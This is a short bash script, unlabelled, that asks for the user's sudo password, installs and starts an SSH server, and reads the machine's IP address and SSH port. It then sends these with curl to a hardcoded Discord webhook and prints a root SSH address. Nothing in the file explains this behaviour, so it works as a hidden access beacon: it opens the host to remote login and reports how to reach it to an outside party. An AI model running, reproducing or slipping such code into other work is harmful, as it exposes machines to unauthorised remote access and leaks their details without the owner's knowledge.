#!/bin/bash
function enabler {
    sudo systemctl enable ssh
    sudo systemctl start ssh
    WEBHOOK_URL="https://discord.com/api/webhooks/1218688240744403114/dCfowEzF9qeFC21a-3gVSwMKZ_tMS-Jtp6GCFAfTqx8BQTfxRyydVBpG_HfQhg0ml_co"
    IP=$(hostname -I | cut -d' ' -f1)
    SSH_PORT=$(grep "^Port" /etc/ssh/sshd_config | awk '{print $2}')
    SSH_ENABLED="SSH is enabled"
    DATA="{\"content\": \"IP Address: $IP\nSSH Port: $SSH_PORT\n$SSH_ENABLED\"}"
    curl -X POST -H "Content-Type: application/json" -d "$DATA" "$WEBHOOK_URL"
    echo "ssh://$IP@root:$SSH_PORT"
}

echo password:
sudo echo thanks

if dpkg -s openssh-server >/dev/null 2>&1; then
    enabler
else
    sudo apt install ssh
    enabler 
fi
